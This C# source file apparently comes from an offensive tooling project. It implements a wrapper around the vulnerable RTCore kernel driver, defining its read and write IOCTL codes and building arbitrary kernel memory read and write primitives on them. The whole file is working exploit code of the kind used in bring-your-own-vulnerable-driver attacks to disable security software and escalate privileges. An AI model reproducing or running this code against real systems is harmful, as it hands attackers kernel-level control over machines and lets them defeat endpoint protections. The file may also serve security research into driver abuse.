using System.Runtime.InteropServices;
using Windows.Win32;

namespace RTCoreVuln;

[StructLayout(LayoutKind.Explicit, Size = 0x30)]
internal struct RTCORE_COMMUNICATION
{
    [FieldOffset(0x8)]
    public ulong Address;
    [FieldOffset(0x18)]
    public uint Size;
    [FieldOffset(0x1C)]
    public uint Value;
}

internal class RTCore : IVulnerableDriver, IDisposable
{
    private readonly CloseServiceHandleSafeHandle _handle;

    private const uint RTCORE_DEVICE_TYPE = 0x8000;
    private const uint RTCORE_FUNCTION_READVM = 0x812;
    private const uint RTCORE_FUNCTION_WRITEVM = 0x813;
    private const uint METHOD_BUFFERED = 0;
    private const uint FILE_ANY_ACCESS = 0;

    private static readonly uint IOCTL_RTCORE_READVM = DeviceIo.CtlCode(RTCORE_DEVICE_TYPE, RTCORE_FUNCTION_READVM, METHOD_BUFFERED, FILE_ANY_ACCESS);
    private static readonly uint IOCTL_RTCORE_WRITEVM = DeviceIo.CtlCode(RTCORE_DEVICE_TYPE, RTCORE_FUNCTION_WRITEVM, METHOD_BUFFERED, FILE_ANY_ACCESS);

    public RTCore(DriverService driverService, string driverName)
    {
        _handle = driverService.OpenServiceByName(driverName);
    }

    public void Dispose()
    {
        _handle?.Dispose();
    }

    public unsafe void Read(ulong address, byte* buffer, uint size)
    {
        uint offset = 0;
        for (; offset + 4 <= size; offset += 4)
            *(uint*)(buffer + offset) = ReadPrimitive<uint>(address + offset);
        for (; offset + 2 <= size; offset += 2)
            *(ushort*)(buffer + offset) = ReadPrimitive<ushort>(address + offset);
        if (offset < size)
            *(buffer + offset) = ReadPrimitive<byte>(address + offset);
    }

    public unsafe void Write(ulong address, byte* buffer, uint size)
    {
        uint offset = 0;
        for (; offset + 4 <= size; offset += 4)
            WritePrimitive(address + offset, *(uint*)(buffer + offset), 4);
        for (; offset + 2 <= size; offset += 2)
            WritePrimitive(address + offset, *(ushort*)(buffer + offset), 2);
        if (offset < size)
            WritePrimitive(address + offset, *(buffer + offset), 1);
    }

    private unsafe T ReadPrimitive<T>(ulong address) where T : unmanaged
    {
        var payload = new RTCORE_COMMUNICATION
        {
            Address = address,
            Size = (uint)sizeof(T)
        };
        DeviceIo.IoControl(_handle, IOCTL_RTCORE_READVM, &payload);
        return *(T*)&payload.Value;
    }

    private unsafe void WritePrimitive(ulong address, uint value, uint size)
    {
        var payload = new RTCORE_COMMUNICATION
        {
            Address = address,
            Size = size,
            Value = value
        };
        DeviceIo.IoControl(_handle, IOCTL_RTCORE_WRITEVM, &payload);
    }
}
